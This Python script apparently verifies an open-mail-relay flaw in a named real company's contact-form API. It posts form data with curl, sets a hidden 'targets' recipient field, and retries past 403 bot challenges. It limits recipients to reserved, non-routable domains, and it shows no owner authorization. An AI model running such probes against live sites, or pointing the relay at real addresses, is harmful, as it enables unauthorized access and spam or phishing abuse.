#!/usr/bin/env python3
"""
Independent verification: unauthenticated attacker-controlled recipient on
POST https://www.infinitycapital.bh/api/send

Only NON-ROUTABLE, RFC-2606-reserved recipient domains are used so that no
real third party / mailbox is ever contacted.  The test proves recipient
control by (a) differential response vs the site's own configured address
and (b) the Resend API's own validation error, which names the `to` field.
"""
import subprocess, time, sys, json, os

URL = "https://www.infinitycapital.bh/api/send"
OUT = os.path.dirname(os.path.abspath(__file__))

BASE = [
    ("fname", "RelayVerify"),
    ("lname", "Tester"),
    ("areacode", "+973"),
    ("tel", "12345678"),
    ("cname", "Independent Verify Ltd"),
    ("subject", "contact enquiry"),
    ("msg", "Independent verification probe."),
    ("check", ""),           # honeypot left EMPTY, as the real form does
]


def post(fields, tag, retries=6):
    for i in range(retries):
        a = ["curl", "-sk", "-m", "45", "-o", f"/tmp/vf_{tag}.bin", "-D", f"/tmp/vf_{tag}.hdr",
             "-w", "%{http_code}|%{size_download}|%{time_total}", "-X", "POST", URL]
        for k, v in fields:
            a += ["-F", f"{k}={v}"]
        r = subprocess.run(a, capture_output=True, text=True)
        code = r.stdout.split("|")[0]
        body = open(f"/tmp/vf_{tag}.bin", "rb").read()
        if code != "403":       # 403 == Vercel bot challenge, retry
            return code, body, r.stdout
        time.sleep(1.5)
    return code, body, r.stdout


CASES = [
    ("A_company_own_address", "info@infinitycapital.bh"),   # what the site itself uses
    ("B_reserved_invalid_tld", "relay-verify@no-such-host.invalid"),
    ("C_reserved_example_net", "relay-verify@mail.example.com"),
    ("D_malformed_to",         "relay-verify@@broken"),
    ("E_honeypot_filled",      "relay-verify@no-such-host.invalid"),  # same as B but check=b00t
]

results = []
for tag, target in CASES:
    fields = list(BASE)
    if tag == "E_honeypot_filled":
        fields = [(k, "b00t" if k == "check" else v) for k, v in fields]
    fields.append(("targets", target))
    code, body, raw = post(fields, tag)
    short = body[:260].decode("utf8", "replace")
    results.append((tag, target, code, raw, short))
    print(f"[{tag}] targets={target!r}")
    print(f"    -> {raw}")
    print(f"    -> {short!r}\n")
    time.sleep(1.0)

with open(os.path.join(OUT, "relay_results.txt"), "w") as f:
    for tag, target, code, raw, short in results:
        f.write(f"### {tag}\ntargets={target}\nresponse={raw}\nbody={short}\n\n")
print("wrote", os.path.join(OUT, "relay_results.txt"))
